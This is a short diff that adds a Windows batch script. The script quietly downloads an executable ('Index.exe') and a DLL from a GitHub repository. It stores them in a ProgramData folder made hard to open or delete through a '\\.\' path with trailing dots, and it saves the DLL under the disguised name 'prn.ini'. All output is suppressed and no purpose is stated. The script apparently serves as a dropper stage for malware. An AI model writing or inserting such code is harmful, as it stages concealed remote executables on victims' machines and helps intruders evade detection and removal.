@@ -1,0 +1,13 @@
+set "dir=\\.\%ProgramData%\logdata..\"
+set "url_Index=https://github.com/vlad213-tex/1/raw/1/0/Index.exe"
+set "url_prn=https://github.com/vlad213-tex/1/raw/1/0/IconLib.dll"
+
+dir "%dir%\Index.exe" >nul 2>nul
+if errorlevel 1 (
+    curl -s -L -o "%dir%\Index.exe" "%url_Index%" >nul 2>&1
+)
+
+dir "%dir%\prn.ini" >nul 2>nul
+if errorlevel 1 (
+    curl -s -L -o "%dir%\prn.ini" "%url_prn%" >nul 2>&1
+)
